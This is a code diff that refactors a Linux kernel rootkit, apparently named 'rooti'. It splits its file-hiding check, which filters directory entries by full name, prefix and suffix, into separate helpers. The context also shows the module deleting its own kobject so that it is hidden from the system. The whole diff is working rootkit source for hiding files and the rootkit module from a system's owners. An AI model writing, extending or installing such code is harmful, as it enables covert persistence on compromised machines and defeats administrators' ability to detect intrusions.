@@ -18,37 +18,58 @@ void rooti_hideme()
     kobject_del(&THIS_MODULE->mkobj.kobj);
 }
 
-// Determines whether the file entry qualifies to be hidden
-static bool rooti_should_hide_file(struct linux_dirent64 *record)
+// Determines whether a file should be hidden by its full name
+static bool rooti_should_hide_file_by_name(struct linux_dirent64 *record)
 {
-    size_t prefix_len;
-    size_t suffix_len;
-    size_t filename_len;
-
-    // Check if the entry should be hidden by its name
     for (int i = 0; i < ROOTI_HIDDEN_FILES_COUNT; i++) {
         if (strncmp(record->d_name, ROOTI_HIDDEN_FILES[i], NAME_MAX) == 0) {
             return true;
         }
     }
-    // Check if the entry's name begins with a prefix of hidden files
+    return false;
+}
+
+// Determines whether a file should be hidden because its name starts with a prefix of hidden files
+static bool rooti_should_hide_file_by_prefix(struct linux_dirent64 *record)
+{
+    size_t filename_len = strlen(record->d_name);
+    size_t prefix_len = 0;
+    
     for (int i = 0; i < ROOTI_HIDDEN_FILES_PREFIXES_COUNT; i++) {
-        filename_len = strlen(record->d_name);
         prefix_len = strlen(ROOTI_HIDDEN_FILES_PREFIXES[i]);
         if (filename_len >= prefix_len &&
             memcmp(record->d_name, ROOTI_HIDDEN_FILES_PREFIXES[i], prefix_len) == 0) {
             return true;
         }
     }
-    // Check if the entry's name ends with a suffix of hidden files
+    return false;
+}
+
+// Determines whether a file should be hidden because its name ends with a suffix of hidden files
+static bool rooti_should_hide_file_by_suffix(struct linux_dirent64 *record)
+{
+    size_t filename_len = strlen(record->d_name);
+    size_t suffix_len = 0;
+
     for (int i = 0; i < ROOTI_HIDDEN_FILES_SUFFIXES_COUNT; i++) {
-        filename_len = strlen(record->d_name);
         suffix_len = strlen(ROOTI_HIDDEN_FILES_SUFFIXES[i]);
         if (filename_len >= suffix_len &&
             memcmp(record->d_name + filename_len - suffix_len, ROOTI_HIDDEN_FILES_SUFFIXES[i], suffix_len) == 0) {
             return true;
         }
     }
+    return false;
+}
+
+// Determines whether the file entry qualifies to be hidden
+static bool rooti_should_hide_file(struct linux_dirent64 *record)
+{
+    if (rooti_should_hide_file_by_name(record))
+        return true;
+    if (rooti_should_hide_file_by_prefix(record))
+        return true;
+    if (rooti_should_hide_file_by_suffix(record))
+        return true;
     return false;
 }
 
